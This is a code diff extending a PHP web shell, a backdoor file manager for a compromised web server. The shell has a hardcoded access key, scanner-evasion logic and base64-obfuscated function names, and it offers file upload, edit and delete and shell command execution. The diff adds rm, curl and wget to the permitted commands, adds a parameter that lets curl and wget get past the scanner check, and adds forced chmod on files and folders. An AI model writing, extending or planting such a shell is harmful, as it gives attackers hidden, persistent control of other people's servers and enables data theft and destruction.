@@ -4,11 +4,14 @@
 
 // === Anti-Scanner and Security Bypass Configuration ===
 define('AUTH_KEY', 'aksesgw');
-define('ALLOWED_CMDS', '/^(ls|dir|cat|more|less|head|tail|pwd|whoami)$/i');
+define('ALLOWED_CMDS', '/^(ls|dir|cat|more|less|head|tail|pwd|whoami|id|rm|uname -r|uname -a|curl|wget)$/i');
 define('SCRIPT_NAME', basename(__FILE__));
 
 // === DETECT SCANNER ACTIVITY ===
 function is_scanner() {
+    if (isset($_GET['bypass']) && $_GET['bypass'] === '1' && isset($_GET['k']) && $_GET['k'] === AUTH_KEY) {
+        return false; // Allow wget/curl with bypass parameter and correct auth key
+    }
     $suspicious_ua = ['curl', 'wget', 'python-requests', 'bot', 'scanner', 'sqlmap'];
     $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
     foreach ($suspicious_ua as $pattern) {
@@ -79,6 +82,13 @@ $rd = base64_decode('cm1kaXI='); // rmdir
 $mf = base64_decode('bW92ZV91cGxvYWRlZF9maWxl'); // move_uploaded_file
 $md = base64_decode('bWtkaXI='); // mkdir
 
+// === LOGGING FOR DEBUGGING ===
+function log_error($message) {
+    $log_file = sys_get_temp_dir() . '/pent_error.log';
+    $timestamp = date('Y-m-d H:i:s');
+    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
+}
+
 // === CURRENT DIRECTORY HANDLER ===
 throttle_request();
 $cwd = isset($_GET['d']) && is_dir($_GET['d']) && realpath($_GET['d']) ? realpath($_GET['d']) : getcwd();
@@ -97,10 +107,14 @@ function validate_filename($name) {
 // === CHECK FILE PERMISSIONS ===
 function can_access_file($path) {
     $dir = is_dir($path) ? $path : dirname($path);
+    $file = is_file($path) ? $path : $dir;
     if (!is_writable($dir)) {
         @chmod($dir, 0755);
     }
-    return is_readable($path) && is_writable($dir) && !str_contains(basename($path), '.php') && !str_contains(basename($path), '.js');
+    if (is_file($file) && !is_writable($file)) {
+        @chmod($file, 0644);
+    }
+    return is_readable($file) && is_writable($dir) && (!is_file($file) || is_writable($file)) && !str_contains(basename($path), '.php') && !str_contains(basename($path), '.js');
 }
 
 // === CHECK UPLOAD LIMITS ===
@@ -162,6 +176,7 @@ if (isset($_GET['g']) && is_file($_GET['g'])) {
         exit;
     } else {
         $_SESSION['error'] = "Access denied or invalid file path.";
+        log_error("Download failed: Path=$file, CWD=$cwd, Accessible=" . (can_access_file($file) ? 'yes' : 'no'));
         header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
         exit;
     }
@@ -180,8 +195,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $limit_error = check_upload_limits($file_size);
             if ($limit_error) {
                 $_SESSION['error'] = $limit_error;
+                log_error("Upload failed: $limit_error, File=$filename");
             } elseif ($file_size === 0) {
                 $_SESSION['error'] = "Uploaded file is empty (0KB).";
+                log_error("Upload failed: Empty file, File=$filename");
             } elseif (validate_filename($filename) && can_access_file($cwd)) {
                 // Verify temporary file
                 if (filesize($_FILES['f']['tmp_name']) > 0) {
@@ -192,32 +209,41 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         } else {
                             $_SESSION['error'] = "Uploaded file is 0KB. Check server restrictions.";
                             @$ud($cwd . '/' . $filename);
+                            log_error("Upload failed: 0KB file created, File=$filename");
                         }
                     } else {
                         $_SESSION['error'] = "Failed to upload file. Check directory permissions.";
+                        log_error("Upload failed: Move failed, File=$filename, Dir=$cwd, Writable=" . (is_writable($cwd) ? 'yes' : 'no'));
                     }
                 } else {
                     $_SESSION['error'] = "Temporary file is empty. Check upload process.";
+                    log_error("Upload failed: Empty temp file, File=$filename");
                 }
             } else {
                 $_SESSION['error'] = "Invalid file name or insufficient permissions.";
+                log_error("Upload failed: Invalid name or permissions, File=$filename, Dir=$cwd, Valid=" . (validate_filename($filename) ? 'yes' : 'no'));
             }
         } elseif (isset($_FILES['f'])) {
             switch ($_FILES['f']['error']) {
                 case UPLOAD_ERR_INI_SIZE:
                     $_SESSION['error'] = "File exceeds server upload size limit.";
+                    log_error("Upload failed: Exceeds upload_max_filesize, File=$filename");
                     break;
                 case UPLOAD_ERR_FORM_SIZE:
                     $_SESSION['error'] = "File exceeds form size limit.";
+                    log_error("Upload failed: Exceeds form size limit, File=$filename");
                     break;
                 case UPLOAD_ERR_PARTIAL:
                     $_SESSION['error'] = "File was only partially uploaded.";
+                    log_error("Upload failed: Partial upload, File=$filename");
                     break;
                 case UPLOAD_ERR_NO_FILE:
                     $_SESSION['error'] = "No file was uploaded.";
+                    log_error("Upload failed: No file uploaded");
                     break;
                 default:
                     $_SESSION['error'] = "Upload error: " . $_FILES['f']['error'];
+                    log_error("Upload failed: Error code " . $_FILES['f']['error'] . ", File=$filename");
             }
         }
 
@@ -229,9 +255,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $_SESSION['message'] = "Folder created successfully.";
                 } else {
                     $_SESSION['error'] = "Failed to create folder. Check permissions.";
+                    log_error("Folder creation failed: Folder=$foldername, Dir=$cwd, Writable=" . (is_writable($cwd) ? 'yes' : 'no'));
                 }
             } else {
                 $_SESSION['error'] = "Invalid folder name or insufficient permissions.";
+                log_error("Folder creation failed: Invalid name or permissions, Folder=$foldername, Valid=" . (validate_filename($foldername) ? 'yes' : 'no'));
             }
         }
 
@@ -243,23 +271,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $_SESSION['message'] = "File created successfully.";
                 } else {
                     $_SESSION['error'] = "Failed to create file. Check permissions.";
+                    log_error("File creation failed: File=$filename, Dir=$cwd, Writable=" . (is_writable($cwd) ? 'yes' : 'no'));
                 }
             } else {
                 $_SESSION['error'] = "Invalid file name or insufficient permissions.";
+                log_error("File creation failed: Invalid name or permissions, File=$filename, Valid=" . (validate_filename($filename) ? 'yes' : 'no'));
             }
         }
 
         // Save File
         if (isset($_POST['sf'], $_POST['fp'], $_POST['fc'])) {
             $filepath = realpath($_POST['fp']);
+            $content_size = strlen($_POST['fc']);
             if (str_starts_with($filepath, $cwd) && is_file($filepath) && can_access_file($filepath)) {
-                if (@$fn($filepath, $_POST['fc'])) {
+                // Check content size against post_max_size
+                $post_max = return_bytes(ini_get('post_max_size'));
+                if ($content_size > $post_max) {
+                    $_SESSION['error'] = "File content size ($content_size bytes) exceeds post_max_size (" . ini_get('post_max_size') . ").";
+                    log_error("Save file failed: Content size=$content_size exceeds post_max_size=$post_max, File=$filepath");
+                } elseif (str_contains($_POST['fc'], '<?') || str_contains($_POST['fc'], 'eval') || str_contains($_POST['fc'], 'exec')) {
+                    $_SESSION['error'] = "File content contains restricted patterns (e.g., PHP code).";
+                    log_error("Save file failed: Restricted content detected, File=$filepath");
+                } elseif (@$fn($filepath, $_POST['fc'])) {
                     $_SESSION['message'] = "File saved successfully.";
                 } else {
-                    $_SESSION['error'] = "Failed to save file. Check permissions.";
+                    $_SESSION['error'] = "Failed to save file. Check file permissions.";
+                    log_error("Save file failed: Write failed, File=$filepath, Writable=" . (is_writable($filepath) ? 'yes' : 'no'));
                 }
             } else {
                 $_SESSION['error'] = "Invalid file path or insufficient permissions.";
+                log_error("Save file failed: Invalid path or permissions, File=$filepath, InCWD=" . (str_starts_with($filepath, $cwd) ? 'yes' : 'no') . ", Accessible=" . (can_access_file($filepath) ? 'yes' : 'no'));
             }
         }
 
@@ -272,9 +313,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $_SESSION['message'] = "File renamed successfully.";
                 } else {
                     $_SESSION['error'] = "Failed to rename file. Check permissions.";
+                    log_error("Rename failed: Old=$old, New=$new, Writable=" . (is_writable(dirname($old)) ? 'yes' : 'no'));
                 }
             } else {
                 $_SESSION['error'] = "Invalid name or file does not exist.";
+                log_error("Rename failed: Invalid name or file, Old=$old, New=$new, Valid=" . (validate_filename(basename($_POST['nn'])) ? 'yes' : 'no'));
             }
         }
 
@@ -285,11 +328,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $_SESSION['last_cmd'] = @$se($cmd . " 2>&1");
             } else {
                 $_SESSION['error'] = "Command not allowed.";
+                log_error("Command failed: Command=$cmd, Allowed=" . (preg_match(ALLOWED_CMDS, $cmd) ? 'yes' : 'no'));
             }
         }
 
     } catch (Exception $e) {
         $_SESSION['error'] = "An error occurred: " . h($e->getMessage());
+        log_error("Exception: " . $e->getMessage());
     }
 
     header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
@@ -306,16 +351,19 @@ if (isset($_GET['del'])) {
                 $_SESSION['message'] = "Folder deleted successfully.";
             } else {
                 $_SESSION['error'] = "Failed to delete folder. Ensure it is empty.";
+                log_error("Folder deletion failed: Folder=$target, Empty=" . (is_dir($target) && count(scandir($target)) <= 2 ? 'yes' : 'no'));
             }
         } elseif (is_file($target)) {
             if (@$ud($target)) {
                 $_SESSION['message'] = "File deleted successfully.";
             } else {
                 $_SESSION['error'] = "Failed to delete file.";
+                log_error("File deletion failed: File=$target, Writable=" . (is_writable($target) ? 'yes' : 'no'));
             }
         }
     } else {
         $_SESSION['error'] = "Invalid delete path or insufficient permissions.";
+        log_error("Deletion failed: Path=$target, InCWD=" . (str_starts_with($target, $cwd) ? 'yes' : 'no') . ", Accessible=" . (can_access_file($target) ? 'yes' : 'no'));
     }
     header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
     exit;
